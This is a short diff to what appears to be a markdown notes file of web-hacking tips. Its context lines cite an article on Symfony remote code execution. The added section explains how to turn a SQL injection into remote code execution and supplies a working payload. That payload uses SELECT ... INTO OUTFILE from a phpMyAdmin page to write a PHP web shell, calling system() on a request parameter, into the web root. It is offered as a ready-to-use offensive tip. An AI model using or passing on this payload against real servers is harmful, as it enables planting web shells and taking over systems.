@@ -11,3 +11,9 @@ It happends often. Check For Misconfigurations
 ```bash
 https://portswigger.net/daily-swig/symfony-based-websites-open-to-rce-attack-research-finds
 ```
+
+# Found SQLi ? Now rce
+```bash
+For Remote code execution I used a simple payload inside phpmyadmin page and I got RCE.
+Payload : SELECT “<?php system($_GET[‘<anyParameter>’]); ?>” into outfile “/var/www/html/<filename>.php”
+```
